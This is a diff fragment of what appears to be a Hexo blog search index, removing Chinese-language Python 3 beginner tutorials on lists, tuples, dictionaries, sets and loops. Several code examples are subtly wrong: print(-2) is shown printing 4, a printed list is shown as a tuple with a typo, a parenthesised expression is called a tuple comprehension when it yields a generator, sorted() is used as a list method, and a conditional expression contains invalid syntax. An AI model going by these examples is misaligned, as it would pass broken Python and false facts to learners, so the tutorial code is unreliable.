-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 序列 :</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">通过<span class="keyword">for</span>循环和<span class="built_in">enumerate</span>()函数遍历列表和索引</span><br><span class="line"><span class="keyword">for</span> 变量<span class="number">1</span>,变量<span class="number">2</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(序列名字):</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">	<span class="built_in">print</span>(i,x)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name &#x3D; [表达式 for 变量 in 序列]</span><br><span class="line">import random</span><br><span class="line">a &#x3D; [random.randint(1,100) for i in range(10)]</span><br><span class="line">从1-100里面随机生成10个数字</span><br><span class="line"></span><br><span class="line">name &#x3D; [表达式 for 变量 in 序列 条件语句]</span><br><span class="line">a &#x3D; [1,2,3,4,5,6]</span><br><span class="line">b &#x3D; [i+1 for i in a if i&gt;0]</span><br><span class="line">print(b)</span><br><span class="line">[2,3,4,5,6,7]</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="方法-method"><a href="#方法-method" class="headerlink" title="方法(method)"></a>方法(method)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line">append()方法:添加元素</span><br><span class="line">对象名.append(新元素)</span><br><span class="line"></span><br><span class="line">index()方法:返回具有指定值的第一个元素的索引</span><br><span class="line">print(对象名.index(元素,起始索引,结束索引))	#起始和结束位置可以省略</span><br><span class="line"></span><br><span class="line">count()方法:统计指定元素出现的次数</span><br><span class="line">对象名.count(元素)</span><br><span class="line"></span><br><span class="line">insert()方法:按指定位置添加元素</span><br><span class="line">对象名.insert(索引,新元素)</span><br><span class="line"></span><br><span class="line">remove()方法:删除指定元素，有多个相同元素只会删除第一个</span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line">pop()方法:删除指定索引，如未指定索引，默认删除最后一个</span><br><span class="line">对象名.pop(索引)</span><br><span class="line"></span><br><span class="line">del 方法:删除列表</span><br><span class="line">del 列表名    #也可以用 del 列表名[索引] 来删除指定索引</span><br><span class="line"></span><br><span class="line">clear()方法:清空列表</span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line">copy()方法:复制列表</span><br><span class="line">变量 &#x3D; 对象名.copy()</span><br><span class="line"></span><br><span class="line">list()方法:复制列表	#也可以使用此函数把其他序列转换为列表</span><br><span class="line">变量 &#x3D; list(对象名)</span><br><span class="line"></span><br><span class="line">extend()方法:合并列表</span><br><span class="line">对象1.extend(对象2&#x2F;元素)</span><br><span class="line"></span><br><span class="line">reverse()方法:颠倒列表顺序</span><br><span class="line">对象名.reverse()</span><br><span class="line"></span><br><span class="line">sort()方法:对列表排序</span><br><span class="line">对象名.sort()				#默认为升序</span><br><span class="line">对象名.sort(reverse&#x3D;True)	#降序</span><br><span class="line"></span><br><span class="line">sorted()方法:对列表排序</span><br><span class="line">对象名.sorted()				#默认为升序</span><br><span class="line">对象名.sorted(reverse&#x3D;True)	#降序</span><br><span class="line">列表对象的sort()方法和内置sorted()函数的作用基本相同</span><br><span class="line">所不同的就是使用sort()方法时，会改变原列表的元素排列顺序</span><br><span class="line">但是使用sorted()函数时，会建立一个原列表的副本，该副本为排序后的列表</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>​        元组（tuple）是Python中另一个重要的序列结构，与列表类似，也是由一系列按特定顺序排列的元素组成。但是它是不可变序列。因此，元组也可以称为不可变的列表。</p>
-<p>元组不能重新赋值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象名 = (元素<span class="number">1</span>,元素<span class="number">2.</span>.....)	</span><br><span class="line">当不是空元组时，括号可以省略，但必须有逗号，比如：对象名 = 元素<span class="number">1</span>,</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="解包（解构）"><a href="#解包（解构）" class="headerlink" title="解包（解构）"></a>解包（解构）</h3><p>解包指就是将元组当中每一个元素都赋值给一个变量<br>在对一个元组进行解包时，变量的数量必须和元组中的元素的数量一致<br>也可以在变量前边添加一个<code>*</code>，这样变量将会获取元组中所有剩余的元素<br>不能同时出现两个或以上的<code>*</code>变量</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a,b,c = 对象名</span><br><span class="line">a,b,*c = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="索引-1"><a href="#索引-1" class="headerlink" title="索引"></a>索引</h3><p>序列中的每个元素都有一个编号，也称为索引（Indexing）。这个索引是从0开始递增的，即下标为0表示第一个元素，下标为1表示第二个元素，依此类推。</p>
-<p>Python的索引可以是负数。这个索引从右向左计数，也就是从最后的一个元素开始计数，即最后一个元素的索引值是−1，倒数第二个元素的索引值为−2，依此类推。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(-<span class="number">2</span>)</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h3><p>把元组转换为列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">y = <span class="built_in">list</span>(x)</span><br><span class="line">y[<span class="number">0</span>] = <span class="string">&quot;hello&quot;</span></span><br><span class="line">x = <span class="built_in">tuple</span>(y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">(<span class="string">&quot;yello&quot;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="遍历元组"><a href="#遍历元组" class="headerlink" title="遍历元组"></a>遍历元组</h3><p>通过for循环遍历列表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 序列 :</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">通过<span class="keyword">for</span>循环和<span class="built_in">enumerate</span>()函数遍历元组和索引</span><br><span class="line"><span class="keyword">for</span> 变量<span class="number">1</span>,变量<span class="number">2</span> <span class="keyword">in</span> <span class="built_in">enumerate</span>(序列名字):</span><br><span class="line">	代码块</span><br><span class="line"></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">	<span class="built_in">print</span>(i,x)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="元组推导式"><a href="#元组推导式" class="headerlink" title="元组推导式"></a>元组推导式</h3><p>和列表推导式一样，只是把<code>[]</code>变成<code>()</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name &#x3D; (表达式 for 变量 in 序列)</span><br><span class="line">import random</span><br><span class="line">a &#x3D; (random.randint(1,100) for i in range(10))</span><br><span class="line">从1-100里面随机生成10个数字</span><br><span class="line"></span><br><span class="line">name &#x3D; (表达式 for 变量 in 序列 条件语句)</span><br><span class="line">a &#x3D; (1,2,3,4,5,6)</span><br><span class="line">b &#x3D; (i+1 for i in a if i&gt;0)</span><br><span class="line">print(b)</span><br><span class="line">(2,3,4,5,6,7)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(x)</span><br><span class="line">创建元组,把x的内容转换为元组,x多为表达式</span><br><span class="line"><span class="built_in">tuple</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> 变量</span><br><span class="line">对于已经创建的元组，不在使用时，可以使用<span class="keyword">del</span>删除</span><br><span class="line"></span><br><span class="line"><span class="built_in">len</span>(x)</span><br><span class="line">通过<span class="built_in">len</span>()函数确定元组的长度</span><br><span class="line"></span><br><span class="line">对象名.index(x)</span><br><span class="line">在元组中搜索x的值并返回它的索引位置</span><br><span class="line"></span><br><span class="line">对象名.count(x)</span><br><span class="line">返回元组中指定值x出现的次数</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="列表和元组的区别"><a href="#列表和元组的区别" class="headerlink" title="列表和元组的区别"></a>列表和元组的区别</h3><ul>
-<li>列表属于可变序列，元素可以修改；元组属于不可变序列，元素不可以修改，除非整体替换。</li>
-<li>列表可以使用很多方法添加和修改元素，而元组没有</li>
-<li>列表可以使用切片访问和修改元素，而元组只可以通过切片访问元素</li>
-<li>元组比列表的访问速度要快，如果不对元素进行修改的时候，建议使用元组</li>
-<li>列表不能作为字典的键，而元组可以</li>
-</ul>
-<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>​        字典（dictionary）和列表类似，也是可变序列，不过与列表不同，它是无序的可变序列，保存的内容是以“键-值对”的形式存放的。</p>
-<p>字典属于一种新的数据结构，称为映射（mapping）</p>
-<p>字典，我们也称为叫做键值对（key-value）结构</p>
-<p>每个字典中都可以有多个键值对，而每一个键值对我们称其为一项（item）</p>
-<p>字典的key不能重复</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	变量 = &#123;key:value,key:value,key:value.......&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="创建字典"><a href="#创建字典" class="headerlink" title="创建字典"></a>创建字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">这里不论是key还是value，只要是字符串，要加引号</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">通过<span class="built_in">dict</span>函数创建字典，这里字符串不需要加引号</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>([(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>),(<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>),(<span class="string">&#x27;c&#x27;</span>,<span class="number">3</span>)])</span><br><span class="line">双值序列创建字典</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="获取字典的值"><a href="#获取字典的值" class="headerlink" title="获取字典的值"></a>获取字典的值</h3><p>通过key获取字典的值</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">a[<span class="string">&#x27;a&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">dict</span>(a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">通过遍历 keys()来获取所有的键</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.keys():</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a.keys():</span><br><span class="line">	<span class="built_in">print</span>(i,a[i])</span><br><span class="line">a <span class="number">1</span></span><br><span class="line">b <span class="number">2</span></span><br><span class="line">c <span class="number">3</span></span><br><span class="line"></span><br><span class="line">通过遍历 values()返回字典的值</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.keys():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    </span><br><span class="line">通过遍历 items()该方法会返回字典中所有的项</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 对象名.items():</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> 对象名.items():</span><br><span class="line">	<span class="built_in">print</span>(k , <span class="string">&#x27;=&#x27;</span> , v)</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line">对象名.get(key，默认值) 该方法用来根据键来获取字典中的值，获取不到会返回默认值</span><br><span class="line"><span class="built_in">print</span>(对象名.get(key))</span><br><span class="line"></span><br><span class="line">修改字典，如果key存在则覆盖，不存在则添加</span><br><span class="line">对象名[key] = value</span><br><span class="line"></span><br><span class="line">setdefault(key[, default]) 可以用来向字典中添加key-value</span><br><span class="line">  如果key已经存在于字典中，则返回key的值，不会对字典做任何操作</span><br><span class="line">  如果key不存在，则向字典中添加这个key，并设置value</span><br><span class="line">对象名.setdefault(key,value)</span><br><span class="line"></span><br><span class="line">update([other])</span><br><span class="line">将其他的字典中的key-value添加到当前字典中</span><br><span class="line">如果有重复的key，则后边的会替换到当前的</span><br><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">d2 = &#123;<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;a&#x27;</span>:<span class="number">7</span>&#125;</span><br><span class="line">d.update(d2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> 用来删除key-value</span><br><span class="line"><span class="keyword">del</span> 对象名[key]</span><br><span class="line"></span><br><span class="line">popitem()随机删除字典中的一个键值对，一般都会删除最后一个键值对，并返回删除的键值对</span><br><span class="line">变量 = 对象名.popitem()</span><br><span class="line"></span><br><span class="line">pop()根据key删除key-value并返回，指定默认值若不存在Key则返回默认值</span><br><span class="line">变量 = 对象名.pop(key,默认值)</span><br><span class="line"></span><br><span class="line">clear()用来清空字典</span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line">copy()方法:复制</span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line">fromkeys()	返回拥有指定键和值的字典</span><br><span class="line">x = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">y = <span class="number">1</span></span><br><span class="line">z = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>.fromkeys(x,y)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line">b = <span class="built_in">dict</span>.fromkeys(x,z)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="string">&#x27;b&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="string">&#x27;c&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)&#125;</span><br><span class="line"></span><br><span class="line">a.fromkeys(a)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;b&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;c&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">a.fromkeys(x,y)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>​        Python中的集合（set）与数学中的集合概念类似，也是用于保存不重复的元素。它有可变集合（set）和不可变集合（frozenset）两种。</p>
-<p>​        在形式上，集合的所有元素都放在一对大括号“{}”中，两个相邻元素间使用逗号“,”分隔。集合最好的应用就是去重，因为集合中的每个元素都是唯一的。</p>
-<p>集合和序列非常相似：</p>
-<p>不同点：</p>
-<p>1.集合中只能存储不可变对象<br>2.集合中存储的对象是无序（不是按照元素的插入顺序保存）<br>3.集合中不能出现重复的元素</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	变量 = &#123;元素<span class="number">1</span>,元素<span class="number">2.</span>.....&#125;</span><br><span class="line">	</span><br><span class="line">可以通过<span class="built_in">set</span>()来将序列和字典转换为集合</span><br><span class="line">变量 = <span class="built_in">set</span>([元素<span class="number">1</span>,元素<span class="number">2.</span>.....])</span><br><span class="line">变量 = <span class="built_in">set</span>(&#123;key:value,key:value.......&#125;)</span><br><span class="line">使用<span class="built_in">set</span>()将字典转换为集合时，只会包含字典中的键</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 向集合中添加元素</span></span><br><span class="line">对象名.add(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() 将一个集合中的元素添加到当前集合中</span></span><br><span class="line"><span class="comment"># update()可以传递序列或字典作为参数，字典只会使用键</span></span><br><span class="line">s2 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">对象<span class="number">1.</span>update(对象<span class="number">2</span>)</span><br><span class="line">对象名.update([元素<span class="number">1</span>，元素<span class="number">2.</span>.....])</span><br><span class="line">对象名.update(&#123;key:value,key:value.......&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()随机删除并返回一个集合中的元素</span></span><br><span class="line">变量 = 对象名.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove()删除集合中的指定元素</span></span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear()清空集合</span></span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy()对集合进行浅复制</span></span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对集合做运算时，不会影响原来的集合，而是返回一个运算结果</span></span><br><span class="line"><span class="comment"># 创建两个集合</span></span><br><span class="line">s = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp; 交集运算</span></span><br><span class="line">result = s &amp; s2 <span class="comment"># &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># | 并集运算</span></span><br><span class="line">result = s | s2 <span class="comment"># &#123;1,2,3,4,5,6,7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 差集</span></span><br><span class="line">result = s - s2 <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ 异或集 获取只在一个集合中出现的元素</span></span><br><span class="line">result = s ^ s2 <span class="comment"># &#123;1, 2, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;= 检查一个集合是否是另一个集合的子集</span></span><br><span class="line"><span class="comment"># 如果a集合中的元素全部都在b集合中出现，那么a集合就是b集合的子集，b集合是a集合超集</span></span><br><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">result = a &lt;= b <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt; 检查一个集合是否是另一个集合的真子集</span></span><br><span class="line"><span class="comment"># 如果超集b中含有子集a中所有元素，并且b中还有a中没有的元素，则b就是a的真超集，a是b的真子集</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">difference()	返回包含两个或更多集合之间差异的集合。</span><br><span class="line">difference_update()	删除此集合中也包含在另一个指定集合中的项目。</span><br><span class="line">discard()	删除指定项目。</span><br><span class="line">intersection()	返回为两个其他集合的交集的集合。</span><br><span class="line">intersection_update()	删除此集合中不存在于其他指定集合中的项目。</span><br><span class="line">isdisjoint()	返回两个集合是否有交集。</span><br><span class="line">issubset()	返回另一个集合是否包含此集合。</span><br><span class="line">issuperset()	返回此集合是否包含另一个集合。</span><br><span class="line">symmetric_difference()	返回具有两组集合的对称差集的集合。</span><br><span class="line">symmetric_difference_update()	插入此集合和另一个集合的对称差集。</span><br><span class="line">union()	返回包含集合并集的集合。</span><br><span class="line">update()	用此集合和其他集合的并集来更新集合。</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-文件与目录</title>
     <url>//aeab54f73184.html</url>
     <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
@@ -1612,55 +1683,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-流程控制语句</title>
-    <url>//f68e861f37cd.html</url>
-    <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
-
-<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">while</span>循环</span><br><span class="line">语法：</span><br><span class="line">  	<span class="keyword">while</span> 条件表达式 :</span><br><span class="line">      	代码块</span><br><span class="line">  	<span class="keyword">else</span> :</span><br><span class="line">      	代码块</span><br><span class="line">当判断条件一直为<span class="literal">True</span>时，<span class="keyword">while</span>循环会一直循环下去，称为死循环</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--<span class="keyword">for</span>循环</span><br><span class="line"><span class="keyword">for</span>循环通常用于遍历序列(如<span class="built_in">list</span>,<span class="built_in">tuple</span>,<span class="built_in">range</span>,<span class="built_in">str</span>),集合(如 <span class="built_in">set</span>)和映射对象(如<span class="built_in">dict</span>)</span><br><span class="line">语法 :</span><br><span class="line">    <span class="keyword">for</span> 临时变量 <span class="keyword">in</span> 可迭代对象 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">break</span>可以用来立即退出循环语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">continue</span>可以用来跳过当次循环</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">pass</span>是用来在判断或循环语句中占位的</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><p>是指在一个循环里面嵌入另一个循环<br>例如:打印99乘法表</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>循环：</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="number">9</span>:</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= j:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span>循环：</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, j+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%d*%d=%d&#x27;</span> % (i, j, i*j), end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-编码</title>
-    <url>//609542bd1343.html</url>
-    <content><![CDATA[<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>计算机在设计时采用8个比特（bit）作为一个字节（byte），<br>所以，一个字节能表示的最大的整数就是255（二进制11111111=十进制255），<br>如果要表示更大的整数，就必须用更多的字节</p>
